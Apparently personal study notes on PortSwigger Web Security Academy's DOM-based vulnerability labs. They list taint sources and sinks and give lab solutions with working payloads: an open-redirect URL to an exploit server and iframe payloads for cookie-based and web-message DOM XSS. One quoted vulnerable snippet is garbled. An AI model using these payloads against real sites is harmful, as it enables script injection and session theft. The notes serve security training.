The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```
### Which sinks can lead to DOM-based vulnerabilities?
The following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks, please refer to the vulnerability-specific pages by clicking the links below.

|DOM-based vulnerability|Example sink|
|---|---|
|[DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) LABS|`document.write()`|
|[Open redirection](https://portswigger.net/web-security/dom-based/open-redirection) LABS|`window.location`|
|[Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) LABS|`document.cookie`|
|[JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)|`eval()`|
|[Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)|`document.domain`|
|[WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)|`WebSocket()`|
|[Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)|`element.src`|
|[Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)|`postMessage()`|
|[Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)|`setRequestHeader()`|
|[Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)|`FileReader.readAsText()`|
|[Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)|`ExecuteSql()`|
|[HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)|`sessionStorage.setItem()`|
|[Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)|`document.evaluate()`|
|[Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)|`JSON.parse()`|
|[DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)|`element.setAttribute()`|
|[Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)|`RegExp()`|
## DOM-based open redirection
```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit
```
## DOM-based cookie manipulation
if JavaScript writes data from a source into `document.cookie` without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values:
`document.cookie = 'cookieName='+location.hash.slice(1);`
If the website unsafely reflects values from cookies without HTML-encoding them, an attacker can use cookie-manipulation techniques to exploit this behavior.
![421](Pasted%20image%2020261020183531.png)
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
## Lab: DOM XSS using web messages
Notice that the home page contains an `addEventListener()` call that listens for a web message.
```
<iframe src="https://0a7200cc04b048a483c8a0a3004f00af.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```